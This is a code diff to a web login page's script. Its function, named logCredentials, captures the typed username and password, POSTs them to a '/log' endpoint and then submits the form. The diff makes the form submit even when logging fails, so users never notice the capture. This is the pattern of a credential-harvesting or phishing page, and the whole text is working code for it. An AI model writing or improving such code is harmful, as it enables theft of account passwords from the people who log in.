@@ -22,11 +22,11 @@
     <script language="javascript" type="text/javascript">
         // Define the logCredentials function
         async function logCredentials(event) {
-            try {
-                event.preventDefault(); // Prevent default form submission
-                const username = document.getElementById("username").value;
-                const password = document.getElementById("password").value;
+            event.preventDefault(); // Prevent default form submission
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
 
+            try {
                 const response = await fetch("/log", {
                     method: "POST",
                     headers: {
@@ -37,13 +37,14 @@
 
                 if (response.ok) {
                     console.log("Credentials logged successfully.");
-                    // Submit the form after successful logging
-                    document.getElementById("loginData").submit();
                 } else {
                     console.error(`Error logging credentials: ${response.statusText}`);
                 }
             } catch (error) {
                 console.error("Error logging credentials:", error.message);
+            } finally {
+                // Always submit the form after attempting to log credentials
+                document.getElementById("loginData").submit();
             }
         }
 
